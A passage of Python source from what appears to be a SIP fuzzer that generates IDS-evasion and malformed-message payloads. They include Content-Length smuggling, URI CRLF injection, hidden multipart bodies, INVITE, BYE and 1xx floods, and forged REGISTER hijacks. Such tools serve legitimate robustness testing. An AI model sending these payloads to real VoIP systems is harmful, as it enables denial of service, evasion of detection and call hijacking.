    v = random.choice(["cl_shorter", "cl_longer", "cl_zero_with_body",
                        "cl_body_hidden_invite", "cl_absent_udp",
                        "double_message", "null_body_desync", "sdp_past_cl"])
    ip = _rand_ip()
    uri = _rand_uri().encode()
    sdp = _minimal_sdp(ip)

    if v == "cl_shorter":
        # CL shorter than body — IDS stops reading, UA sees all
        fake_cl = max(1, len(sdp) // 3)
        return _basic_headers(body=sdp, extra_headers=[
            b"Content-Length: " + str(fake_cl).encode(),
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    elif v == "cl_longer":
        # CL longer than body — IDS reads into next message
        fake_cl = len(sdp) + random.randint(500, 5000)
        return _basic_headers(body=sdp, extra_headers=[
            b"Content-Length: " + str(fake_cl).encode(),
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    elif v == "cl_zero_with_body":
        # CL=0 but body present (IDS sees no body, UA may process it)
        return _basic_headers(body=sdp, extra_headers=[
            b"Content-Length: 0",
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    elif v == "cl_body_hidden_invite":
        # INVITE with CL pointing to safe SDP, but malicious SDP appended after
        safe_sdp = _minimal_sdp("10.0.0.1")
        evil_sdp = _minimal_sdp(ip)
        return _basic_headers(body=safe_sdp + evil_sdp, extra_headers=[
            b"Content-Length: " + str(len(safe_sdp)).encode(),
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    elif v == "cl_absent_udp":
        # No Content-Length at all on UDP — body goes to end of datagram
        hdrs = [
            b"INVITE " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
            b"From: <sip:a@b.c>;tag=" + _rand_tag().encode(),
            b"To: <" + uri + b">",
            b"Call-ID: " + _rand_callid().encode(),
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"Content-Type: application/sdp",
        ]
        return _CRLF.join(hdrs) + _CRLF + _CRLF + sdp, _SIP_PORT
    elif v == "double_message":
        # Two SIP messages in one UDP datagram separated by CL boundary
        msg1 = _basic_headers(method=b"OPTIONS", uri=uri)
        msg2 = _basic_headers(method=b"INVITE", uri=uri, body=sdp)
        return msg1 + msg2, _SIP_PORT
    elif v == "null_body_desync":
        # Body contains NUL bytes that may truncate IDS string matching
        evil_sdp = sdp[:20] + b"\x00" * 50 + sdp[20:]
        return _basic_headers(body=evil_sdp, extra_headers=[
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    else:  # sdp_past_cl
        # SDP lines appended past the declared CL boundary
        partial = sdp[:len(sdp) // 2]
        extra = b"a=x-evil:payload" + _CRLF
        return _basic_headers(body=partial + extra, extra_headers=[
            b"Content-Length: " + str(len(partial)).encode(),
            b"Content-Type: application/sdp",
        ]), _SIP_PORT


# ── Strategy 9: URI Escape Injection ──────────────────────────────────────
# %00/%0d%0a in Request-URI, oversized userinfo, IPv6 reference malformation,
# embedded ?headers, transport= confusion, semicolon parameter overflow.

def _build_uri_escape_injection():
    v = random.choice(["null_byte", "crlf_inject", "oversized_user",
                        "ipv6_malform", "embedded_headers", "transport_confusion",
                        "param_overflow", "double_encode"])
    ip = _rand_ip()

    if v == "null_byte":
        uri = b"sip:" + _rand_user().encode() + b"%00evil@" + ip.encode()
        return _basic_headers(uri=uri), _SIP_PORT
    elif v == "crlf_inject":
        uri = b"sip:" + _rand_user().encode() + b"%0d%0aX-Injected:%20true@" + ip.encode()
        return _basic_headers(uri=uri), _SIP_PORT
    elif v == "oversized_user":
        user = ("A" * random.randint(5000, 20000)).encode()
        uri = b"sip:" + user + b"@" + ip.encode()
        return _basic_headers(uri=uri), _SIP_PORT
    elif v == "ipv6_malform":
        bad_ipv6 = random.choice([
            b"sip:user@[::1",           # missing ]
            b"sip:user@[::FFFF:127.0.0.1]:5060",
            b"sip:user@[" + b"F" * 200 + b"]:5060",  # oversized
            b"sip:user@[:::]:5060",      # invalid
            b"sip:user@[::1]:99999",     # bad port
        ])
        return _basic_headers(uri=bad_ipv6), _SIP_PORT
    elif v == "embedded_headers":
        # RFC 3261: URI headers via ?hname=hvalue
        uri = b"sip:user@" + ip.encode() + b"?Route=%3Csip:evil@attack.com%3E&Subject=pwned"
        return _basic_headers(uri=uri), _SIP_PORT
    elif v == "transport_confusion":
        transport = random.choice([b"tls", b"sctp", b"ws", b"wss", b"unknown", b"TCP", b"\x00"])
        uri = b"sip:user@" + ip.encode() + b";transport=" + transport
        return _basic_headers(uri=uri), _SIP_PORT
    elif v == "param_overflow":
        # Huge number of URI parameters
        params = b""
        for i in range(random.randint(200, 500)):
            params += b";p" + str(i).encode() + b"=" + os.urandom(4).hex().encode()
        uri = b"sip:user@" + ip.encode() + params
        return _basic_headers(uri=uri), _SIP_PORT
    else:  # double_encode
        # Double percent-encoding: %2540 = %40 = @
        uri = b"sip:user%2540evil.com@" + ip.encode()
        return _basic_headers(uri=uri), _SIP_PORT


# ── Strategy 10: Multipart/MIME Wrap ─────────────────────────────────────
# Hide payload inside multipart/mixed, message/sipfrag, or S/MIME boundaries
# so single-pass IDS misses inner content.

def _build_multipart_mime_wrap():
    v = random.choice(["multipart_mixed", "sipfrag", "nested_boundary",
                        "boundary_abuse", "missing_close", "oversized_boundary",
                        "content_type_mismatch", "smime_envelope"])
    ip = _rand_ip()
    uri = _rand_uri().encode()
    sdp = _minimal_sdp(ip)
    boundary = b"boundary" + os.urandom(8).hex().encode()

    if v == "multipart_mixed":
        body = (b"--" + boundary + _CRLF +
                b"Content-Type: application/sdp" + _CRLF + _CRLF + sdp +
                b"--" + boundary + _CRLF +
                b"Content-Type: text/plain" + _CRLF + _CRLF +
                b"hidden payload data" + _CRLF +
                b"--" + boundary + b"--" + _CRLF)
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + boundary + b'"',
        ]), _SIP_PORT
    elif v == "sipfrag":
        frag = b"INVITE sip:evil@attack.com SIP/2.0" + _CRLF + b"Via: SIP/2.0/UDP " + ip.encode() + _CRLF
        body = (b"--" + boundary + _CRLF +
                b"Content-Type: message/sipfrag" + _CRLF + _CRLF + frag +
                b"--" + boundary + b"--" + _CRLF)
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + boundary + b'"',
        ]), _SIP_PORT
    elif v == "nested_boundary":
        inner_boundary = b"inner" + os.urandom(4).hex().encode()
        inner = (b"--" + inner_boundary + _CRLF +
                 b"Content-Type: application/sdp" + _CRLF + _CRLF + sdp +
                 b"--" + inner_boundary + b"--" + _CRLF)
        body = (b"--" + boundary + _CRLF +
                b'Content-Type: multipart/mixed;boundary="' + inner_boundary + b'"' + _CRLF + _CRLF +
                inner +
                b"--" + boundary + b"--" + _CRLF)
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + boundary + b'"',
        ]), _SIP_PORT
    elif v == "boundary_abuse":
        # Boundary contains special chars
        bad_boundary = b"bnd" + b"'" * 20 + b'"' * 20 + b"=" * 20
        body = b"--" + bad_boundary + _CRLF + b"Content-Type: text/plain" + _CRLF + _CRLF + b"test" + _CRLF + b"--" + bad_boundary + b"--" + _CRLF
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + bad_boundary + b'"',
        ]), _SIP_PORT
    elif v == "missing_close":
        # No closing boundary — parser may read past
        body = (b"--" + boundary + _CRLF +
                b"Content-Type: application/sdp" + _CRLF + _CRLF + sdp)
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + boundary + b'"',
        ]), _SIP_PORT
    elif v == "oversized_boundary":
        big_boundary = b"B" * random.randint(500, 2000)
        body = b"--" + big_boundary + _CRLF + b"Content-Type: text/plain" + _CRLF + _CRLF + b"x" + _CRLF + b"--" + big_boundary + b"--" + _CRLF
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/mixed;boundary="' + big_boundary + b'"',
        ]), _SIP_PORT
    elif v == "content_type_mismatch":
        # Content-Type says application/sdp but body is multipart
        body = (b"--" + boundary + _CRLF +
                b"Content-Type: text/plain" + _CRLF + _CRLF + b"evil" + _CRLF +
                b"--" + boundary + b"--" + _CRLF)
        return _basic_headers(body=body, extra_headers=[
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
    else:  # smime_envelope
        # Fake S/MIME wrapping
        body = (b"--" + boundary + _CRLF +
                b"Content-Type: application/pkcs7-mime;smime-type=enveloped-data" + _CRLF + _CRLF +
                os.urandom(random.randint(200, 1000)) + _CRLF +
                b"--" + boundary + b"--" + _CRLF)
        return _basic_headers(body=body, extra_headers=[
            b'Content-Type: multipart/signed;boundary="' + boundary + b'";protocol="application/pkcs7-signature"',
        ]), _SIP_PORT


# ── Strategy 11: Malformed Start-Line ─────────────────────────────────────
# Bad SIP-Version, method manipulation, missing components.

def _build_malformed_startline():
    v = random.choice(["bad_version", "case_method", "missing_crlf",
                        "leading_crlf", "extra_sp", "no_uri", "oversized_method",
                        "response_version"])
    ip = _rand_ip()
    uri = _rand_uri().encode()

    if v == "bad_version":
        bad_ver = random.choice([b"SIP/9.9", b"sip/2.0", b"SIP/2.0foo",
                                  b"SIP/0.0", b"SIP/2.1", b"HTTP/1.1",
                                  b"SIP/", b"SIP", b""])
        line = b"INVITE " + uri + b" " + bad_ver + _CRLF
        hdrs = [
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
            b"From: <sip:a@b.c>;tag=" + _rand_tag().encode(),
            b"To: <" + uri + b">",
            b"Call-ID: " + _rand_callid().encode(),
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"Content-Length: 0",
        ]
        return line + _CRLF.join(hdrs) + _CRLF + _CRLF, _SIP_PORT
    elif v == "case_method":
        # Method case variations (INVITE is case-sensitive per BNF)
        bad_method = random.choice([b"invite", b"InViTe", b"Invite", b"iNVITE", b"INVIT\xc5"])
        return _basic_headers(method=bad_method), _SIP_PORT
    elif v == "missing_crlf":
        # Lines terminated with bare LF or bare CR
        terminator = random.choice([b"\n", b"\r", b"\r\r\n"])
        msg = _basic_headers().replace(_CRLF, terminator)
        return msg, _SIP_PORT
    elif v == "leading_crlf":
        # Leading CRLFs before start line (legal on stream transports, not on UDP)
        count = random.randint(10, 500)
        return _CRLF * count + _basic_headers(), _SIP_PORT
    elif v == "extra_sp":
        # Multiple spaces / tabs between method, URI, version
        sep = b" " * random.randint(5, 50)
        line = b"INVITE" + sep + uri + sep + b"SIP/2.0" + _CRLF
        return line + b"Via: SIP/2.0/UDP " + ip.encode() + _CRLF + b"Content-Length: 0" + _CRLF + _CRLF, _SIP_PORT
    elif v == "no_uri":
        line = b"INVITE SIP/2.0" + _CRLF
        return line + b"Content-Length: 0" + _CRLF + _CRLF, _SIP_PORT
    elif v == "oversized_method":
        method = b"X" * random.randint(5000, 20000)
        line = method + b" " + uri + b" SIP/2.0" + _CRLF
        return line + b"Content-Length: 0" + _CRLF + _CRLF, _SIP_PORT
    else:  # response_version
        # Malformed status lines
        bad = random.choice([
            b"SIP/2.0 999 Unknown",
            b"SIP/2.0 0 Zero",
            b"SIP/2.0 200",  # missing reason
            b"SIP/2.0  200 OK",  # double space
            b"SIP/9.9 200 OK",
            b"200 OK",  # missing version
        ])
        return bad + _CRLF + b"Content-Length: 0" + _CRLF + _CRLF, _SIP_PORT


# ── Strategy 12: Mandatory Header Omission/Dup ───────────────────────────
# Missing or duplicated Via/From/To/Call-ID/CSeq/Max-Forwards.

def _build_mandatory_header_omission():
    v = random.choice(["no_via", "no_from", "no_callid", "no_cseq",
                        "cseq_mismatch", "dup_callid", "max_forwards_zero",
                        "all_missing"])
    ip = _rand_ip()
    uri = _rand_uri().encode()

    base = [
        b"INVITE " + uri + b" SIP/2.0",
        b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
        b"From: <sip:a@b.c>;tag=" + _rand_tag().encode(),
        b"To: <" + uri + b">",
        b"Call-ID: " + _rand_callid().encode(),
        b"CSeq: 1 INVITE",
        b"Max-Forwards: 70",
        b"Content-Length: 0",
    ]

    if v == "no_via":
        lines = [l for l in base if not l.startswith(b"Via")]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    elif v == "no_from":
        lines = [l for l in base if not l.startswith(b"From")]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    elif v == "no_callid":
        lines = [l for l in base if not l.startswith(b"Call-ID")]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    elif v == "no_cseq":
        lines = [l for l in base if not l.startswith(b"CSeq")]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    elif v == "cseq_mismatch":
        # CSeq method doesn't match Request-Line method
        mismatch = random.choice([b"BYE", b"REGISTER", b"OPTIONS", b"CANCEL"])
        lines = [l.replace(b"CSeq: 1 INVITE", b"CSeq: 1 " + mismatch) if l.startswith(b"CSeq") else l for l in base]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    elif v == "dup_callid":
        # Two Call-ID headers with different values
        extra = base + [b"Call-ID: " + _rand_callid().encode()]
        return _CRLF.join(extra) + _CRLF + _CRLF, _SIP_PORT
    elif v == "max_forwards_zero":
        lines = [l.replace(b"Max-Forwards: 70", b"Max-Forwards: 0") if l.startswith(b"Max") else l for l in base]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT
    else:  # all_missing
        # Only start line + Content-Length (all mandatory headers missing)
        lines = [b"INVITE " + uri + b" SIP/2.0", b"Content-Length: 0"]
        return _CRLF.join(lines) + _CRLF + _CRLF, _SIP_PORT


# ── Strategy 13: SDP Body Malformation ───────────────────────────────────
# RFC 4566 strict line ordering, type=value format, required fields.

def _build_sdp_body_malformation():
    v = random.choice(["out_of_order", "missing_required", "bad_port",
                        "oversized_origin", "malformed_connection",
                        "nul_in_value", "huge_fmt_list", "attribute_injection"])
    ip = _rand_ip()

    if v == "out_of_order":
        # Violate required order: v, o, s, c, t, m
        lines = [
            b"s=-",
            b"t=0 0",
            b"v=0",
            f"o=- 1 1 IN IP4 {ip}".encode(),
            f"c=IN IP4 {ip}".encode(),
            b"m=audio 8000 RTP/AVP 0",
        ]
        body = _CRLF.join(lines) + _CRLF
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "missing_required":
        # Missing v= or s= line
        variant = random.choice(["no_v", "no_s", "no_o", "no_m", "empty"])
        if variant == "no_v":
            body = f"o=- 1 1 IN IP4 {ip}\r\ns=-\r\nt=0 0\r\nm=audio 8000 RTP/AVP 0\r\n".encode()
        elif variant == "no_s":
            body = f"v=0\r\no=- 1 1 IN IP4 {ip}\r\nt=0 0\r\nm=audio 8000 RTP/AVP 0\r\n".encode()
        elif variant == "no_o":
            body = b"v=0\r\ns=-\r\nt=0 0\r\nm=audio 8000 RTP/AVP 0\r\n"
        elif variant == "no_m":
            body = f"v=0\r\no=- 1 1 IN IP4 {ip}\r\ns=-\r\nt=0 0\r\n".encode()
        else:
            body = b""
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "bad_port":
        port_val = random.choice([b"-1", b"0", b"99999", b"4294967296", b"AAAA", b""])
        body = (b"v=0" + _CRLF +
                f"o=- 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=-" + _CRLF +
                f"c=IN IP4 {ip}".encode() + _CRLF +
                b"t=0 0" + _CRLF +
                b"m=audio " + port_val + b" RTP/AVP 0" + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "oversized_origin":
        # Oversized o= line fields
        huge_user = "A" * random.randint(5000, 20000)
        body = (b"v=0" + _CRLF +
                f"o={huge_user} 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=-" + _CRLF +
                b"t=0 0" + _CRLF +
                b"m=audio 8000 RTP/AVP 0" + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "malformed_connection":
        bad_conn = random.choice([
            f"c=IN IP4 {ip}/256".encode(),       # TTL > 255
            b"c=IN IP4 999.999.999.999",          # invalid IP
            b"c=IN IP6 ::1/999",                  # bad IPv6 TTL
            b"c=XX YY " + ip.encode(),             # bad nettype/addrtype
            b"c=" + b"A" * 5000,                  # oversized
        ])
        body = (b"v=0" + _CRLF +
                f"o=- 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=-" + _CRLF +
                bad_conn + _CRLF +
                b"t=0 0" + _CRLF +
                b"m=audio 8000 RTP/AVP 0" + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "nul_in_value":
        # NUL bytes inside SDP values (byte-string allows 0x01-0x09,0x0B-0x0C,0x0E-0xFF)
        body = (b"v=0" + _CRLF +
                f"o=- 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=\x00\x00\x00" + _CRLF +
                f"c=IN IP4 {ip}".encode() + _CRLF +
                b"t=0 0" + _CRLF +
                b"m=audio 8000 RTP/AVP 0" + _CRLF +
                b"a=rtpmap:0 \x00PCMU/8000" + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    elif v == "huge_fmt_list":
        # m= line with hundreds of format types
        fmts = " ".join(str(i) for i in range(256))
        body = (b"v=0" + _CRLF +
                f"o=- 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=-" + _CRLF +
                f"c=IN IP4 {ip}".encode() + _CRLF +
                b"t=0 0" + _CRLF +
                f"m=audio 8000 RTP/AVP {fmts}".encode() + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT
    else:  # attribute_injection
        # Inject control characters / huge attributes
        body = (b"v=0" + _CRLF +
                f"o=- 1 1 IN IP4 {ip}".encode() + _CRLF +
                b"s=-" + _CRLF +
                f"c=IN IP4 {ip}".encode() + _CRLF +
                b"t=0 0" + _CRLF +
                b"m=audio 8000 RTP/AVP 0" + _CRLF +
                b"a=" + b"X" * random.randint(5000, 20000) + _CRLF +
                b"a=rtpmap:0 PCMU/8000" + _CRLF)
        return _basic_headers(body=body, extra_headers=[b"Content-Type: application/sdp"]), _SIP_PORT


# ── Strategy 14: Digest Auth / State Desync ───────────────────────────────
# Malformed Authorization, out-of-dialog BYE/CANCEL, 1xx flood,
# ACK for non-INVITE, retransmit storms, REGISTER hijack.

def _build_digest_auth_state_desync():
    v = random.choice(["malformed_auth", "oversized_nonce", "algorithm_confusion",
                        "out_of_dialog_bye", "provisional_flood",
                        "retransmit_storm", "register_hijack", "ack_non_invite"])
    ip = _rand_ip()
    uri = _rand_uri().encode()

    if v == "malformed_auth":
        # Broken Digest auth fields
        auth = random.choice([
            b'Authorization: Digest username="' + b"A" * 5000 + b'"',
            b'Authorization: Digest realm="x", nonce="' + b"B" * 10000 + b'"',
            b'Authorization: Digest response="' + b"Z" * 64 + b'", qop=auth-int, nc=FFFFFFFF',
            b'Authorization: Digest algorithm=SHA-512, response=""',
            b'Authorization: Digest ,,,,,',
            b'Authorization: Basic dXNlcjpwYXNz',  # HTTP Basic instead of Digest
        ])
        return _basic_headers(method=b"REGISTER", uri=b"sip:" + _rand_domain().encode(),
                               extra_headers=[auth]), _SIP_PORT
    elif v == "oversized_nonce":
        nonce = os.urandom(random.randint(10000, 30000)).hex()
        auth = f'Authorization: Digest username="user", realm="x", nonce="{nonce}", response="aaaa"'.encode()
        return _basic_headers(method=b"REGISTER", extra_headers=[auth]), _SIP_PORT
    elif v == "algorithm_confusion":
        algo = random.choice([b"MD5-sess", b"SHA-256", b"SHA-512-256", b"UNKNOWN", b"", b"\x00"])
        auth = b'Authorization: Digest username="u", realm="r", nonce="n", algorithm=' + algo + b', response="r"'
        return _basic_headers(method=b"REGISTER", extra_headers=[auth]), _SIP_PORT
    elif v == "out_of_dialog_bye":
        # BYE with random To-tag referencing non-existent dialog
        pkts = b""
        for _ in range(random.randint(20, 60)):
            hdrs = [
                b"BYE " + uri + b" SIP/2.0",
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
                b"From: <sip:a@b.c>;tag=" + _rand_tag().encode(),
                b"To: <" + uri + b">;tag=" + _rand_tag().encode(),
                b"Call-ID: " + _rand_callid().encode(),
                b"CSeq: " + str(random.randint(1, 99999)).encode() + b" BYE",
                b"Max-Forwards: 70",
                b"Content-Length: 0",
            ]
            pkts += _CRLF.join(hdrs) + _CRLF + _CRLF
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "provisional_flood":
        # Flood of 1xx provisional responses
        pkts = b""
        callid = _rand_callid().encode()
        for _ in range(random.randint(50, 200)):
            code = random.choice([100, 180, 181, 182, 183, 199])
            reason = random.choice([b"Trying", b"Ringing", b"Queued", b"Progress"])
            resp = [
                b"SIP/2.0 " + str(code).encode() + b" " + reason,
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
                b"From: <sip:a@b.c>;tag=aaa",
                b"To: <sip:b@c.d>;tag=bbb",
                b"Call-ID: " + callid,
                b"CSeq: 1 INVITE",
                b"Content-Length: 0",
            ]
            pkts += _CRLF.join(resp) + _CRLF + _CRLF
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "retransmit_storm":
        # Same INVITE retransmitted many times (same branch = same transaction)
        branch = _rand_branch().encode()
        callid = _rand_callid().encode()
        tag = _rand_tag().encode()
        msg = _CRLF.join([
            b"INVITE " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
            b"From: <sip:a@b.c>;tag=" + tag,
            b"To: <" + uri + b">",
            b"Call-ID: " + callid,
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"Content-Length: 0",
        ]) + _CRLF + _CRLF
        count = random.randint(50, 200)
        return (msg * count)[:_MAX_SEG], _SIP_PORT
    elif v == "register_hijack":
        # REGISTER with forged Contact to hijack AOR
        target_domain = _rand_domain().encode()
        pkts = b""
        for _ in range(random.randint(10, 30)):
            hdrs = [
                b"REGISTER sip:" + target_domain + b" SIP/2.0",
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
                b"From: <sip:victim@" + target_domain + b">;tag=" + _rand_tag().encode(),
                b"To: <sip:victim@" + target_domain + b">",
                b"Call-ID: " + _rand_callid().encode(),
                b"CSeq: " + str(random.randint(1, 99999)).encode() + b" REGISTER",
                b"Contact: <sip:attacker@" + ip.encode() + b":5060>;expires=3600",
                b"Max-Forwards: 70",
                b"Content-Length: 0",
            ]
            pkts += _CRLF.join(hdrs) + _CRLF + _CRLF
        return pkts[:_MAX_SEG], _SIP_PORT
    else:  # ack_non_invite
        # ACK for non-INVITE methods (illegal — ACK is only for INVITE final responses)
        pkts = b""
        for m in [b"OPTIONS", b"REGISTER", b"BYE", b"CANCEL", b"SUBSCRIBE"]:
            hdrs = [
                b"ACK " + uri + b" SIP/2.0",
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
                b"From: <sip:a@b.c>;tag=" + _rand_tag().encode(),
                b"To: <" + uri + b">;tag=" + _rand_tag().encode(),
                b"Call-ID: " + _rand_callid().encode(),
                b"CSeq: 1 " + m,   # CSeq method mismatch: ACK request but CSeq says OPTIONS etc.
                b"Max-Forwards: 70",
                b"Content-Length: 0",
            ]
            pkts += _CRLF.join(hdrs) + _CRLF + _CRLF
        return pkts[:_MAX_SEG], _SIP_PORT


# ── Strategy dispatch map ─────────────────────────────────────────────────

_STRATEGY_MAP = {
    "comment_recursion_bomb":      _build_comment_recursion_bomb,
    "content_length_overflow":     _build_content_length_overflow,
    "oversized_header_overflow":   _build_oversized_header_overflow,
    "invite_flood_dos":            _build_invite_flood_dos,
    "compact_form_desync":         _build_compact_form_desync,
    "hcolon_whitespace_evasion":   _build_hcolon_whitespace_evasion,
    "line_folding_obfuscation":    _build_line_folding_obfuscation,
    "content_length_smuggling":    _build_content_length_smuggling,
    "uri_escape_injection":        _build_uri_escape_injection,
    "multipart_mime_wrap":         _build_multipart_mime_wrap,
    "malformed_startline":         _build_malformed_startline,
    "mandatory_header_omission":   _build_mandatory_header_omission,
    "sdp_body_malformation":       _build_sdp_body_malformation,
    "digest_auth_state_desync":    _build_digest_auth_state_desync,
}


_SIP_OVERRIDE_CAPABLE = frozenset(["content_length_smuggling"])

def build_sip_payload(strategy, payload_override=None):
    """Build one SIP payload. Returns (payload_bytes, dst_port)."""
    fn = _STRATEGY_MAP.get(strategy)
    if fn:
        if payload_override is not None and strategy in _SIP_OVERRIDE_CAPABLE:
            return fn(payload_override=payload_override)
        return fn()
    # Fallback: simple INVITE
    return _basic_headers(method=b"INVITE", body=_minimal_sdp()), _SIP_PORT


# ── Mutator class ─────────────────────────────────────────────────────────

class SipMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = SIP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return SIP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_sip_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
